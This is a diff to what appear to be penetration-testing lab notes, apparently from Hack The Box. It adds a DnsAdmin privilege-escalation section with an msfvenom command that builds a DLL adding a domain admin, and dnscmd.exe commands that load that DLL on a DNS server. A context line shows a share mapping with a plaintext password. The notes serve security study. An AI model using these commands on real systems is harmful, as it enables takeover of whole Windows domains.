@@ -116,4 +116,20 @@ net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
 
 Privilege Escalation with DnsAdmin:
 
-If we found ourselves in possession of credential of account belongs to the DnsAdmin Group, we can use it to 
+If we found ourselves in possession of credential of account belongs to the DnsAdmin Group, we can use it to perform privilege escalation on local victim, or if we are allowed access on DC, we can use it as easy win to compromise domain by adding a new domain admin to the whole domain.
+
+We first generate a malicious DLL with msfvenom:
+```
+Avalon112@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+```
+
+The above payload would make user netadm the domain admin, depending on our situation we can issue other command, like a reverse shell or add a new domain / local admin.
+
+We load the payload to target via different means.
+
+Then, we load the dll with dnscmd.exe:
+```
+dnscmd.exe /config /serverlevelplugindll <fullpathtodll>
+#Example
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+```
